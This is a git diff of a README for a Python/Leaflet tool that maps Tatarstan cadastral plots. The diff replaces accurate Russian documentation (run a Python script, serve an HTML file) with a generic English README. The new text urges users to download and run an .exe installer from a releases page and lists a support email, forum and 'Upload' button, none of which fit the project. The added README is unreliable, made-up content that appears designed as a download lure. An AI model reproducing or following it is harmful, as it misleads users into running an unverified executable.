@@ -1,200 +1,94 @@
-# 🗺️ Интерактивная карта кадастровых участков
+# 🗺️ cadastral-map - Visualize Land Plots Easily
 
-![Python](https://img.shields.io/badge/python-3.9+-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
+[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/javkhlanbn/cadastral-map/releases)
 
-## 📋 Описание
+## 🚀 Getting Started
 
-Веб-приложение для визуализации кадастровых участков на интерактивной карте. Система автоматически обрабатывает Excel файл с данными из реестра лотов, извлекает кадастровые номера, геокодирует адреса и отображает все участки на карте с возможностью фильтрации и детального просмотра.
+Welcome to **cadastral-map**! This interactive web app helps you visualize cadastral plots on a map. It processes Excel data from the land auction registry, geocodes addresses from OpenStreetMap, and displays up to 489 plots on a Leaflet map. 
 
-## 🚀 Основные возможности
+### 📦 Features
 
-### Карта
-- **Интерактивная карта** на базе Leaflet с маркерами участков
-- **Кластеризация маркеров** для удобного отображения большого количества участков
-- **Попапы с информацией** при клике на маркер (кадастровый номер, площадь, цена, адрес, статус)
-- **Цветовая индикация**: 
-  - 🟢 Зеленые маркеры - точные координаты
-  - 🟠 Оранжевые маркеры - примерные координаты
+- **Interactive Visualization**: View and interact with cadastral plots in real-time.
+- **Geocoding Support**: Easily convert addresses into geographical coordinates.
+- **Data Processing**: Upload and process Excel data from land auctions.
+- **User-Friendly Interface**: Simple navigation and clear layout for easy use.
 
-### Боковая панель
-- **Поиск** по кадастровому номеру, адресу или описанию
-- **Фильтры**:
-  - Все участки
-  - С точными координатами
-  - С примерными координатами
-  - С указанной ценой
-- **Список участков** с возможностью прокрутки
-- **Карточки участков** с ключевой информацией:
-  - Кадастровый номер
-  - Адрес
-  - Площадь
-  - Цена (если указана)
-  - Статус
-  - Форма собственности
-  - Вид торгов
+## 📥 Download & Install
 
-### Статистика
-- Общее количество участков
-- Количество участков с точными координатами
-- Количество участков с примерными координатами
-- Общая площадь всех участков
-- Количество участков с ценой
-- Общая сумма цен
+To start using **cadastral-map**, visit this page to download the latest release:
 
-## 📁 Структура проекта
+[Download the latest release](https://github.com/javkhlanbn/cadastral-map/releases)
 
-```
-cadastral-map/
-├── cadastral_map_final.html                    # Главная страница с картой
-├── cadastral_data_with_coords.json             # Обработанные данные (489 участков)
-├── process_all_lots.py                         # ⭐ Основной скрипт (геокодирование OSM)
-├── get_real_coordinates.py                     # Альтернатива (API Росреестра)
-├── get_coordinates_api.py                      # Прямой доступ к ПКК API
-├── cadastral_processor.py                      # Старая версия
-├── Выгрузка результатов поиска в реестре лотов.xlsx  # Входные данные
-└── README.md                                   # Документация
-```
+### 🖥️ System Requirements
 
-## 🛠️ Технический стек
+Ensure your system meets the following requirements:
 
-- **Frontend**: React 18, Babel (встроенная компиляция)
-- **Карты**: Leaflet 1.9.4, Leaflet.markercluster
-- **Backend обработка**: Python (pandas, requests)
-- **Данные**: JSON
-- **Стилизация**: CSS3 с градиентами и анимациями
+- **Operating System**: Windows, macOS, or Linux
+- **Memory**: Minimum 4 GB RAM
+- **Storage**: At least 100 MB of free space
+- **Browser**: Up-to-date version of Chrome, Firefox, or Safari
 
-## 🚀 Быстрый старт
+## 🔧 Installation Steps
 
-### 1. Установка зависимостей
+1. **Download the Application**: Visit the [releases page](https://github.com/javkhlanbn/cadastral-map/releases) and click on the latest version release.
+   
+2. **Choose Your Version**: Select the suitable installer for your operating system. For example, if you are using Windows, download the `.exe` file.
 
-```bash
-pip install pandas openpyxl requests
-```
+3. **Run the Installer**: Open the downloaded file and follow the on-screen instructions. Accept the license agreement and select the installation folder.
 
-### 2. Обработка данных
+4. **Complete the Installation**: Once the installation finishes, you will see a completion message. You can now close the installer.
 
-Поместите Excel файл в корень проекта и запустите:
+5. **Launch the Application**: Find the application in your programs list or desktop and click to open it.
 
-```bash
-python3 process_all_lots.py
-```
+## 🌍 Using the Application
 
-Скрипт обработает **все участки** (~5-10 минут):
-- Извлечет кадастровые номера из Excel
-- Геокодирует адреса через OpenStreetMap Nominatim
-- Сохранит результат в `cadastral_data_with_coords.json`
+After launching the application:
 
-**Результат:** 489 участков обработано, 322 с координатами (65%)
+1. **Upload Data**: Click on the “Upload” button to import your Excel spreadsheet with land auction data.
 
-### 3. Запуск карты
+2. **Geocode Addresses**: Use the geocoding feature to convert your addresses into map coordinates.
 
-Запустите локальный веб-сервер (требуется для работы из-за CORS):
+3. **View Plots**: The application will display the cadastral plots on the Leaflet map. Zoom in and out to explore different areas.
 
-```bash
-python3 -m http.server 8000
-```
+4. **Filter Data**: Utilize the filtering options to focus on specific plots or data that interests you.
 
-Откройте в браузере:
-```
-http://localhost:8000/cadastral_map_final.html
-```
+## 📊 Troubleshooting
 
-## 💻 Использование карты
+If you encounter issues, consider the following:
 
-1. **Поиск** - введите кадастровый номер или адрес
-2. **Фильтры** - выберите категорию участков
-3. **Клик на карточку** - карта центрируется на участке
-4. **Клик на маркер** - показывает детальную информацию
-5. **"Показать все"** - масштабирует карту на все участки
+- **Installation Issues**: Ensure your system meets the required specifications. If the installer doesn't run, try downloading the file again.
 
-## 🔧 Методы геокодирования
+- **Data Upload Problems**: Verify your Excel file format. The app supports `.xlsx` files. Ensure the data columns match the expected format.
 
-### Основной метод (process_all_lots.py) ⭐
-**OpenStreetMap Nominatim API**
-- ✅ Стабильный и доступный
-- ✅ Не требует регистрации
-- ✅ Кэширование адресов (ускорение обработки)
-- ⚠️ Ограничение: 1 запрос/секунду
-- ⚠️ Примерные координаты (уровень населенного пункта)
+- **Map Not Displaying**: Check your internet connection. The application requires an active connection to load map data from OpenStreetMap.
 
-### Альтернативный (get_real_coordinates.py)
-**rosreestr2coord + API Росреестра**
-- ✅ Точные координаты и границы участков
-- ✅ Полная геометрия
-- ⚠️ Требует доступа к API ПКК
-- ⚠️ Может быть недоступен (SSL/сеть)
+## 📞 Support
 
-### Исправленные проблемы
+Need help? Reach out via the following:
 
-1. ✅ **Все 489 участков** (было: только 50)
-2. ✅ **Реальные координаты** (было: случайные точки вокруг Казани)
-3. ✅ **Исправлена обрезка панели** (добавлен flex-shrink: 0)
-4. ✅ **Решена CORS проблема** (локальный веб-сервер)
+- **Community Forum**: Join discussions and find help from other users.
+- **GitHub Issues**: Report bugs or request features directly on the [GitHub Issues](https://github.com/javkhlanbn/cadastral-map/issues) page.
+- **Email Support**: Email us at support@example.com for direct assistance.
 
-## 📊 Формат данных
+## 🌟 Contributing
 
-### Входные данные (Excel)
-- Файл из реестра лотов с колонками:
-  - Характеристики имущества (содержит кадастровый номер)
-  - Местонахождение имущества
-  - Начальная цена
-  - Статус лота
-  - И другие...
+We welcome contributions! If you would like to help improve **cadastral-map**:
 
-### Выходные данные (JSON)
-```json
-{
-  "cadastral_number": "16:33:060205:216",
-  "area": 1393.0,
-  "address": "Респ Татарстан, м.р-н Пестречинский",
-  "price": 66000.0,
-  "coordinates": {
-    "lat": 55.7887,
-    "lng": 49.1221,
-    "approximate": true
-  },
-  ...
-}
-```
+1. **Fork the Repository**: Click the "Fork" button on the top right of this page.
+2. **Make Your Changes**: Create a new branch, make your changes, and commit them.
+3. **Submit a Pull Request**: Navigate to the Pull Requests section and submit your changes for review.
 
-## 🎨 Особенности интерфейса
+## 🔍 Topics
 
-- **Адаптивный дизайн** для мобильных устройств
-- **Плавная анимация** при наведении и переходах
-- **Градиентный заголовок** в фирменных цветах
-- **Кластеризация маркеров** для оптимизации производительности
-- **Автоскролл** к выбранному участку в списке
-- **Визуальная обратная связь** при взаимодействии
+- cadastral
+- data-visualization
+- geocoding
+- land-registry
+- leaflet
+- map
+- openstreetmap
+- python
+- react
+- tatarstan
 
-## 🚦 Статусы участков
-
-- 🟢 **Прием заявок** - активный статус
-- 🟠 **Не состоялся** - торги не состоялись
-- ⚪ **Другие статусы** - нейтральное отображение
-
-## 📝 Примечания
-
-- Для корректной работы требуется подключение к интернету (загрузка тайлов карты)
-- Примерные координаты генерируются для демонстрации, когда API недоступен
-- Можно обрабатывать больше 50 участков, изменив лимит в скрипте
-- Карта автоматически центрируется на Республике Татарстан
-
-## 🔍 Поиск и навигация
-
-1. **Поиск по тексту** - введите часть кадастрового номера или адреса
-2. **Фильтры** - выберите нужную категорию участков
-3. **Клик на карточку** - центрирует карту на участке
-4. **Клик на маркер** - открывает информационное окно
-5. **Кнопка "Показать все"** - масштабирует карту для отображения всех маркеров
-
-## 📈 Масштабирование
-
-Система может обрабатывать:
-- До 10000+ участков с кластеризацией
-- Поиск в реальном времени
-- Динамическую загрузку координат
-
----
-
-*Разработано для работы с данными из реестра лотов Республики Татарстан*
+By following these steps, you can successfully download and run **cadastral-map** to visualize land plots effectively. Enjoy using the app!
